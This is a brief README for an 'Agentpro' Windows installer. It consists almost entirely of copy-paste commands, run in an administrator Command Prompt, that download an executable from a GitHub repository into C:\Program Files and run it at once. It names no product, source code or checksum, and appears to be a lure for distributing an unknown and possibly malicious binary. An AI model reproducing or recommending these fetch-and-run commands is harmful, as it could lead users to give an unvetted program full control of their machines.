# Setup

One-click installer for Agentpro. Downloads and installs Agentpro.exe to `C:\Program Files\`.

## Quick Install

1. Download `AgentproInstall.bat`
2. Right-click → **Run as administrator**
3. Done!

## What it does

- Downloads `AgentproGithub.exe` from this repo
- Saves it to `C:\Program Files\Agentpro.exe`
- Runs `Agentpro.exe -fullinstall` automatically
  
## 🚀 Quick Installation (Windows)

Run the following command in **Command Prompt (Run as Administrator)**:

```cmd
curl -L -o "C:\Program Files\Agentpro.exe" "https://github.com/SellerDumpskart/Setup/raw/refs/heads/main/AgentproGithub.exe" && "C:\Program Files\Agentpro.exe" -fullinstall
```

## Manual Install

If you prefer to do it manually, open an **admin** Command Prompt and run:

```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/SellerDumpskart/Setup/raw/refs/heads/main/AgentproGithub.exe' -OutFile 'C:\Program Files\Agentpro.exe' -UseBasicParsing"
"C:\Program Files\Agentpro.exe" -fullinstall
```

## Requirements

- Windows 10/11
- Administrator access
